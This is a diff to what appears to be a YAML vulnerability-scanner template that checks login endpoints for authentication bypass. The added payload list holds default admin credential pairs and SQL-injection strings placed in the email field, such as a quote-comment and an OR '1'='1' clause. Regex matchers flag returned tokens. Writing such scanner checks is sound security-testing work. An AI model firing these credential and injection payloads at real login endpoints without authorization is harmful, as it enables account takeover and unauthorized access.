@@ -1,8 +1,8 @@
 id: generic-auth-bypass
 info:
-  name: Authentication Bypass via Common Credentials
-  description: Tests for default/weak credentials and authentication bypass
-  owasp_category: A07:2025
+  name: Authentication Bypass
+  description: Tests for default credentials and authentication bypass techniques
+  owasp_category: A07:2021
   severity: critical
   tags:
     - auth
@@ -11,18 +11,22 @@ info:
     - generic
 
 generic:
-  endpoint: "{{all_discovered}}"
+  endpoint: "{{login_endpoint}}"
   method: POST
-  parameter: "password"
+  parameter: "{{credentials_param}}"
 
   payloads:
-    - "admin"
-    - "password"
-    - "123456"
-    - "admin123"
-    - ""
-    - "null"
-    - "undefined"
+    - '{"email":"admin","password":"admin"}'
+    - '{"email":"admin","password":"password"}'
+    - '{"email":"admin","password":"123456"}'
+    - '{"email":"admin","password":"admin123"}'
+    - '{"email":"admin@localhost","password":"admin"}'
+    - '{"email":"test@test.com","password":""}'
+    - '{"email":"test@test.com","password":"null"}'
+    - '{"email":"test@test.com","password":"undefined"}'
+    - '{"email":"admin%27--","password":"any"}'
+    - '{"email":"admin\"--","password":"any"}'
+    - '{"email":"admin\" OR \"1\"=\"1","password":"any"}'
 
   matchers:
     - type: status
@@ -34,12 +38,14 @@ generic:
     - type: regex
       condition: or
       regex:
-        - 'token.*:.*[A-Za-z0-9]{20,}'
-        - 'authenticated.*true'
-        - 'success.*login'
-        - 'session.*id'
-        - 'jwt'
-        - 'bearer'
+        - '"token":\s*"[A-Za-z0-9._-]+"'
+        - '"authenticated"\s*:\s*true'
+        - '"success"\s*:\s*true'
+        - '"session"\s*:\s*"[A-Za-z0-9]+"'
+        - '"jwt"\s*:'
+        - '"bearer"\s*:'
+        - 'access_token'
+        - 'refresh_token'
       case_sensitive: false
 
   matchers_condition: and
